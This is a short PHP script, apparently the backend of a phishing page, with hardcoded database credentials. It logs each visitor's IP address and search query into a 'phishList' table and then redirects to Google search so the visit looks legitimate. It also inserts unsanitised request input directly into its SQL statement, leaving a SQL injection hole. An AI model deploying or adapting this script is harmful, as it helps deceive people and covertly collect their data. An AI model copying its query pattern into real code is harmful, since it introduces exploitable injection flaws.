<!-- Database (phishingDB) -->
<?php
$server = "localhost";
$username = "php";
$password = "password";
$database = "phishingDB";

$conn = mysqli_connect($server, $username, $password, $database);

$async_query = $_GET['query'] ?? null;

$IP = $_SERVER["REMOTE_ADDR"];
$query = htmlspecialchars($_POST['query']);

$sql = "INSERT INTO phishList (IP, query)
        VALUES ('$IP', '$async_query')";

$result = mysqli_query($conn, $sql);

header("Location: https://www.google.com/search?q=$query");

mysqli_close($conn);
?>